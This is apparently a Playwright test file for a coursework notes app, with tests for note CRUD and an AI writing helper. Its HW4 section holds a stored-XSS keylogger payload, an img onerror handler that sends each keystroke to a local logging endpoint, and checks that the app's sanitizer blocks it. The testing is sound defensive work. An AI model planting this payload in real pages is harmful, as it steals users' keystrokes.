import { test, expect, request, type Page } from "@playwright/test";
import fs from "fs";
import path from "path";

const API = "http://localhost:3001";

// keylog.txt lives at the repo root (one level above frontend/).
const KEYLOG_PATH = path.resolve(process.cwd(), "..", "keylog.txt");

// Unique credentials so parallel CI runs don't clobber each other.
const USER = {
  name: "Playwright User",
  email: `pw_${Date.now()}@test.com`,
  username: `pwuser_${Date.now()}`,
  password: "pwpass123",
};

async function login(page: Page) {
  await page.goto("/login");
  await page.fill('[data-testid="login_form_username"]', USER.username);
  await page.fill('[data-testid="login_form_password"]', USER.password);
  await page.click('[data-testid="login_form_login"]');
  // Wait until the "New Note" button appears — confirms we're logged in and on the main page.
  await page.waitForSelector('button[name="text_input_new_note"]', { timeout: 15000 });
}

async function createNote(page: Page, content: string) {
  await page.click('button[name="text_input_new_note"]');
  await page.fill('input[name="text_input_new_note"]', content);
  await page.click('button[name="text_input_save_new_note"]');
  await expect(page.locator(".notification")).toHaveText("Added a new note");
}

// Create the test user once via the backend API before any test runs.
test.beforeAll(async () => {
  const ctx = await request.newContext();
  await ctx
    .post(`${API}/users`, {
      data: {
        name: USER.name,
        email: USER.email,
        username: USER.username,
        password: USER.password,
      },
    })
    .catch(() => {}); // ignore if already exists
  await ctx.dispose();
});

// Log in before every test (hw3 + hw4 alike).
test.beforeEach(async ({ page }) => {
  await login(page);
});

// ── HW3 CARRY-OVER ───────────────────────────────────────────────────────────

test("should create a new note", async ({ page }) => {
  await page.click('button[name="text_input_new_note"]');
  await page.fill('input[name="text_input_new_note"]', "Playwright test note");
  await page.click('button[name="text_input_save_new_note"]');
  await expect(page.locator(".notification")).toHaveText("Added a new note");
  await expect(page.locator(".note").first()).toContainText("Playwright test note");
});

test("should display notes with title and author", async ({ page }) => {
  await createNote(page, "Note for read test");
  const firstNote = page.locator(".note").first();
  await expect(firstNote.locator("h2")).toBeVisible();
  await expect(firstNote.locator("small")).toBeVisible();
});

test("should update a note", async ({ page }) => {
  // Use a unique string so we can find this exact note even if there are many in the DB.
  const unique = `update-${Date.now()}`;
  await createNote(page, unique);
  const thisNote = page.locator(".note", { hasText: unique }).first();
  const noteId = await thisNote.getAttribute("data-testid");

  await page.click(`[data-testid="edit-${noteId}"]`);
  const textarea = page.locator(`textarea[data-testid="text_input-${noteId}"]`);
  await textarea.click();
  await textarea.fill("Updated by Playwright");
  await page.click(`[data-testid="text_input_save-${noteId}"]`);

  await expect(page.locator(".notification")).toHaveText("Note updated");
  await expect(page.locator(`[data-testid="${noteId}"]`)).toContainText("Updated by Playwright");
});

test("should delete a note", async ({ page }) => {
  const unique = `delete-${Date.now()}`;
  await createNote(page, unique);
  const thisNote = page.locator(".note", { hasText: unique }).first();
  const noteId = await thisNote.getAttribute("data-testid");

  await page.click(`[data-testid="delete-${noteId}"]`);

  await expect(page.locator(".notification")).toHaveText("Note deleted");
  await expect(page.locator(`[data-testid="${noteId}"]`)).not.toBeVisible();
});

test("Notes-based AI assistant flow", async ({ page }) => {
  test.setTimeout(90000); // AI model can take up to ~30 s

  await page.click('button[name="text_input_new_note"]');
  const noteInput = page.locator('input[name="text_input_new_note"]');
  const before = await noteInput.inputValue();

  await page.click('[data-testid="help_me_write"]');
  await page.fill('[data-testid="help_me_write_prompt"]', "Write one short sentence.");
  await page.click('[data-testid="help_me_write_submit"]');

  await expect(noteInput).not.toHaveValue(before, { timeout: 60000 });
  await expect(noteInput).not.toHaveValue("", { timeout: 60000 });
});

// ── HW4: RICH-TEXT / XSS / SANITIZER ────────────────────────────────────────
// beforeEach already logs us in; the toggle resets to ON on every page load.

const KEYLOGGER_PAYLOAD =
  `hello <img src=x onerror="document.addEventListener('keydown',function(e){fetch('http://localhost:4000/log',{method:'POST',body:e.key});});"> world`;

test("rich-text rendering is preserved", async ({ page }) => {
  // Sanitizer is ON by default; <b> is whitelisted and must survive as a real element.
  await createNote(page, "Hello <b>RICHWORLD</b>");
  const bold = page
    .locator('[data-testid="note_body"]', { hasText: "RICHWORLD" })
    .locator("b");
  await expect(bold.first()).toHaveText("RICHWORLD");
});

// Serial so the two XSS tests share keylog.txt in a defined order.
test.describe.serial("XSS via stored HTML", () => {
  test("attack runs when the sanitizer is OFF", async ({ page }) => {
    // beforeEach navigated to / and logged in; toggle is ON (React default).
    const toggle = page.locator('[data-testid="sanitizer_toggle"]');
    if (((await toggle.textContent()) ?? "").includes("ON")) await toggle.click();
    await expect(toggle).toHaveText("Sanitizer: OFF");

    await createNote(page, KEYLOGGER_PAYLOAD);

    // Wait for the img onerror to fire and install the keydown listener.
    await expect(
      page.locator('[data-testid="note_body"]', { hasText: "hello" }).first()
    ).toBeVisible();
    await page.waitForTimeout(500);

    await page.mouse.click(5, 5);
    await page.keyboard.type("xyz");

    // POSTs are async — poll until the keystroke lands in the log.
    await expect
      .poll(() => {
        try { return fs.readFileSync(KEYLOG_PATH, "utf8"); } catch { return ""; }
      }, { timeout: 10000 })
      .toContain("x");
  });

  test("attack is blocked when the sanitizer is ON", async ({ page }) => {
    fs.writeFileSync(KEYLOG_PATH, ""); // reset

    // beforeEach re-navigated to / and logged in; toggle is ON (React default after reload).
    const toggle = page.locator('[data-testid="sanitizer_toggle"]');
    await expect(toggle).toHaveText("Sanitizer: ON");

    await createNote(page, KEYLOGGER_PAYLOAD);
    await page.waitForTimeout(1000);

    await page.mouse.click(5, 5);
    await page.keyboard.type("xyz");
    await page.waitForTimeout(2000);

    const log = fs.existsSync(KEYLOG_PATH) ? fs.readFileSync(KEYLOG_PATH, "utf8") : "";
    expect(log).toBe("");
  });
});
